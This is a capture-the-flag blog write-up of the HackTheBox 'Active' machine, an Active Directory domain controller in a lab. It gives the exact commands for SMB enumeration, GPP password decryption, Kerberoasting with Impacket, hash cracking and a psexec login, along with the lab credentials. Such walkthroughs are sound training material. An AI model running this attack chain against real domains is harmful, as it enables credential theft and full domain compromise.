---
layout: default
title : muzec - Active Writeup
---


![image](https://user-images.githubusercontent.com/69868171/124292498-8b3e1b00-db4d-11eb-9d81-3b1b2033ad6c.png)

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```
# Nmap 7.91 scan initiated Fri Jul  2 05:11:00 2021 as: nmap -sC -sV -oA nmap 10.10.10.100
Nmap scan report for 10.10.10.100
Host is up (0.39s latency).
Not shown: 981 closed ports
PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
82/tcp    filtered xfer
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2021-07-02 12:13:11Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
2383/tcp  filtered ms-olap4
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
49152/tcp open     msrpc         Microsoft Windows RPC
49153/tcp open     msrpc         Microsoft Windows RPC
49154/tcp open     msrpc         Microsoft Windows RPC
49155/tcp open     msrpc         Microsoft Windows RPC
49157/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open     msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3h00m56s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-07-02T12:14:16
|_  start_date: 2021-07-02T04:37:58

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul  2 05:13:37 2021 -- 1 IP address (1 host up) scanned in 157.11 seconds
```

Windows and it my first on HackTheBox so we have many ports so i start my enumeration on the SMB port to check if anonymous logins is allowed.

`smbclient -L //10.10.10.100/ -N`

![image](https://user-images.githubusercontent.com/69868171/124294416-909c6500-db4f-11eb-8d5b-afe7f3466c52.png)

I decided to use `SMBMAP` also to check which of the share we have access to.

`smbmap -H 10.10.10.100`

![image](https://user-images.githubusercontent.com/69868171/124294821-0a345300-db50-11eb-800f-3faca42f7083.png)

Seems we have read permission on the `Replication` share let use `smbclient` to log in.

`smbclient  //10.10.10.100/Replication -N`

![image](https://user-images.githubusercontent.com/69868171/124295159-6bf4bd00-db50-11eb-8630-02162a5f5dc2.png)

Going through all files in the share i found something cool with credentials store in it.

![image](https://user-images.githubusercontent.com/69868171/124295628-fa693e80-db50-11eb-9ec5-107d6cde84bf.png)

`cd active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\` 

I try doing some research on the `Groups.xml` file i got on the SMB share.

Group Policy Preference (GPP) file. GPP was introduced with the release of Windows Server 2008 and it allowed for the configuration of domain-joined computers. A dangerous feature of GPP was the ability to save passwords and usernames in the preference files. While the passwords were encrypted with AES, the key was made publicly available.

So if we managed to compromise any domain account, we can simply grab the groups.xml file and decrypt the passwords.

![image](https://user-images.githubusercontent.com/69868171/124296301-b32f7d80-db51-11eb-9dc1-565ea2b65f6f.png)

Now we know we are on the right track let hit it. We have a username also a password which is encrypted let find a way to decrypt it.

![image](https://user-images.githubusercontent.com/69868171/124296559-04d80800-db52-11eb-9dc9-eedb5f058b05.png)

```
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

gpp-decrypt is present on kali and gpp-decrypt is a simple ruby script that will decrypt a given GPP encrypted string.

We know have a valid credentials to get access to the machine username: `SVC_TGS` password: `GPPstillStandingStrong2k18` also we know we are working on a active directory machine we can use the credentials we have now to query for a ticker.

Now let’s try a technique known as Kerberoasting.  Kerberoasting is one of the most common attacks against domain controllers. It is used to crack a Kerberos (encrypted password) hash using brute force techniques.

![image](https://user-images.githubusercontent.com/69868171/124298654-6ac58f00-db54-11eb-98e0-a5d8a5d92588.png)

If you compromise a user that has a valid kerberos ticket-granting ticket (TGT), then you can request one or more ticket-granting service (TGS) service tickets for any Service Principal Name (SPN) from a domain controller. An example SPN would be the Application Server shown in the above figure.

A portion of the TGS ticket is encrypted with the hash of the service account associated with the SPN. Therefore, you can run an offline brute force attack on the encrypted portion to reveal the service account password. Therefore, if you request an administrator account TGS ticket and the administrator is using a weak password, we’ll be able to crack it!

Now time for us to use `Impacket` and it can easily be install with the command below;

```
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket/
python setup.py install #install software
```

Done installing we will be using the ` GetUserSPNs.py` script let try to locate it.

![image](https://user-images.githubusercontent.com/69868171/124299670-9b59f880-db55-11eb-8f27-5a36d5c30d24.png)


`GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request` 

And boom We were able to request a TGS from an Administrator SPN.

If you find this error from Linux: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) it because of your local time, you need to synchronise the host with the DC: ntpdate <IP of DC>

Now that we have the hash let crack it using john the ripper save in a file name `hash` .
  
![image](https://user-images.githubusercontent.com/69868171/124300528-96497900-db56-11eb-9c22-4fdde6c07803.png)

We have credentials for administrator now let use `psexec.py` to get access to it through the SMB share.
  
`psexec.py active.htb/administrator:Ticketmaster1968@10.10.10.100` 

![image](https://user-images.githubusercontent.com/69868171/124301085-3acbbb00-db57-11eb-9524-a06f99cd55bf.png)

we are system let go get the flags lol.

![image](https://user-images.githubusercontent.com/69868171/124301449-c47b8880-db57-11eb-986d-cfa7a9e7e881.png)

Now let get the administrator Flag.
  
![image](https://user-images.githubusercontent.com/69868171/124301625-fdb3f880-db57-11eb-9de4-57a20d1f1e0d.png)

We are done damn it right actually my first Windows machine more to come and keep updating.
  

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
